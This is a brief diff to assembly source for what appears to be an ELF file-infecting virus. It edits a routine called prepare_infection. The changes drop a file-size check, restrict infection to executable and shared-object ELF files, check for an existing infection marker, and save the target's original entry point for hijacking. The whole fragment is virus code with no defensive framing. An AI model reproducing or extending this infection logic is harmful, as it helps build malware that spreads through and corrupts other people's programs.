@@ -640,8 +640,6 @@ prepare_infection:
 
 	; mmap(0, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0)
 	mov		rax, [rel file_size]
-	cmp		rax, 0x1000
-	jb		.close_file
 
 	mov     rax, SYS_mmap
 	xor     rdi, rdi
@@ -667,6 +665,15 @@ prepare_infection:
 	; check infected
 	cmp byte [r14 + 0xa], 0x0
 	jne .close_file
+
+	cmp	byte [r14 + 0x10], 0x02
+	je	.continue_infection
+	cmp	byte [r14 + 0x10], 0x03
+	je	.continue_infection
+
+	jmp	.close_file
+
+	.continue_infection:
 
 	mov		rax, [r14 + 0x18] ; e_entry
 	mov		[old_entry], rax
